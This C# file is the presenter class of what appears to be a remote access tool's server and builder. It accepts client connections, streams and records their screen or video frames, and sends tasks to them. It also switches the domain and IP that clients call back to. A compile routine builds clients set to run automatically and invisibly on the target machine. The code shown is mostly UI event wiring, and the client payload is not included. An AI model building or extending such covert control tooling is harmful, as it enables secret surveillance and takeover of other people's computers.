using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using networkWork.view;
using networkWork.model;
using System.Net.Sockets;

namespace networkWork.presenter
{
    public class mainPresenter
    {
        private videoStream vS;
        private mainWindow mW;

        public mainPresenter(videoStream vS, mainWindow mW)
        {
            this.vS = vS;
            this.mW = mW;

            vS.connectionClientEvent += mW.connectionClient;
            vS.shutdownClientEvent += mW.shutdownClient;
            vS.shutdownClientEvent += VS_shutdownClientEvent;
            mW.streamStart += startStreem;
            mW.sendInfo += taskStream.sendTask;
            mW.ipEvent += MW_ipEvent;
            mW.compile += MW_compile;
            mW.chooseNetwork += MW_chooseNetwork;
            mW.StartSaveFraim += MW_StartSaveFraim;
            mW.StopSaveFraim += MW_StopSaveFraim;
            GO.networkCongestionMonitoring += mW.showNetworkLoad;
            taskStream.message += mW.message;

            vS.listenSocets(10);
            GO.startNetworkMonitoring(1000);
        }

        private void MW_chooseNetwork(string network)
        {
            GO.Instance = network;
        }

        private void MW_ipEvent(ipMode mode, string value) 
        {
            Task.Run(() =>
            {
               try
               {
                   switch (mode)
                   {
                       case ipMode.checkIp:
                           mW.message(GO.parceIP(value), "IP");
                           break;
                       case ipMode.getCurentIp:
                           mW.message(GO.parceIP("https://2ip.ru", "<big id=\"d_clip_button\">(.*)</big>"), "Curent IP");
                           break;
                       case ipMode.getDomain:
                           mW.message(GO.getDomain(), "Domain");
                           break;
                       case ipMode.getDomainIp:
                           mW.message(GO.parceIP(GO.getDomain()), "IP for domain");
                           break;
                       case ipMode.setNewDomein:
                           GO.writeNewDomein(value);
                           mW.message($"Completed {value}", "New domain");
                           break;
                       case ipMode.setNewIp:
                           mW.message($"Response {GO.setNewIp(value)}", "New ip");
                           break;
                   }
               }
               catch (Exception e)
               {
                   mW.message($"{e.Message} :(", "Error!");
               }
            });             
        }

        private void startStreem(Socket client, streamWindow sW)
        {
            sW.client = client;
            vS.AddActionForSocket(client, sW.draw);
            sW.buttonTask += vS.sendTask;
            sW.closeWindow += vS.RemoveActionForSocket;
        }

        private Dictionary<Socket, ImgSaver> boffer = new Dictionary<Socket, ImgSaver>();
        private void MW_StartSaveFraim(Socket client, string path)
        {
            string[] h = path.Split(new char[] { '\\' });
            if (h[h.Length - 1].Split(new char[] { '.' })[0] == "")
            {
                mW.message($"Not a valid path :(", "Error!");
                return;
            }

            ImgSaver saver = new ImgSaver(path.Replace(h[h.Length - 1], ""), h[h.Length - 1]);
            vS.AddActionForSocket(client, saver.SaveImg);
            boffer.Add(client, saver);
        }

        private void MW_StopSaveFraim(Socket client)
        {
            if (!boffer.ContainsKey(client))
                return;
            vS.RemoveActionForSocket(client, boffer[client].SaveImg);
            boffer.Remove(client);
        }


        private void VS_shutdownClientEvent(Socket client, string arg2, DateTime arg3)
        {
            MW_StopSaveFraim(client);
        }

        private void MW_compile(compileMode mode, string server, bool autoRun, bool invise, string path)
        {
            try
            {
                clientCompiler.compile(mode, server, autoRun, invise, path);
                mW.message("Сompile successfully :)", "Сompile!");
            }
            catch(Exception e)
            {
                mW.message($"{e.Message} :(", "Error!");
            }
        }
    }
}
